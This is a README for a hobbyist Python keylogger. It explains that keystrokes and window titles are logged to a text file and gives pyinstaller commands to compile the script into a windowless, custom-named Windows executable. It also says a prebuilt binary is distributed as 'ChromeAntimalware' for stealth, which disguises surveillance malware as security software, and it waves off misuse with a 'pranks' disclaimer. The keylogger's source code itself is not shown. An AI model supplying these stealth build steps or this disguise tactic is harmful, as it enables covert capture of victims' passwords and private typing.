# python-keylogger

A simple, light keylogger written in python 3.

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.


### Prerequisites

* Python 3
* pyHook for python 3( downloaded from [here](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook) )

Open a command window in the directory where the appropriate file is stored, and type:


```
pip install <name_of_the_whl_file>
```

* pyinstaller (to convert the program to .exe, hence to be able to run it on any machine)

```
pip install pyinstaller
```

### Installing

Once you have the file up and running without any ImportErrors, it's pretty self explanatory. The keystrokes and the window name are logged into a text file called "logs.txt", which is created automatically by the program.

* To convert it to an executable file, firstly save the file with a .pyw extension.
* Open a command window in the file's folder and run the following (This is what I did, you can easily customise these parameters):


```
pyinstaller --noconfirm ^
-i <location of an icon of your choice> ^
--noconsole ^
--windowed ^
--onefile ^
--noupx ^
--clean ^
--win-private-assemblies ^
--name <A name of your choice> ^
--workpath .\compile\build ^
--distpath .\compile\dist ^
--specpath .\compile ^
mykeylogger.pyw
```

You should see something like this, if done successfully:

<img width="454" alt="4" src="https://user-images.githubusercontent.com/17317792/39061913-76e40baa-44e3-11e8-96e2-e41f8751d91b.PNG">

After this step, there wil two folders created, out of which the executable is present within the "compile" folder.This has subfolders too, but you can find the executable after digging around a bit.

The awesome part is you can delete these extra folders, and keep the executable alone. This executable file can run on any windows machine, regardless of if it has python on it or not.


If you want to avoid all this pain I went through, I've also uploaded the exe file with the name "ChromeAntimalware" for extra stealth purposes.


## WARNING

I'm not responsible for any harmful use of this software. This was created for fun pranks and hobby purposes only.

### Conclusion

That's it! Make sure to star this project to show your support and to disprove the fact that I have no friends whatsoever. And please use it for good.
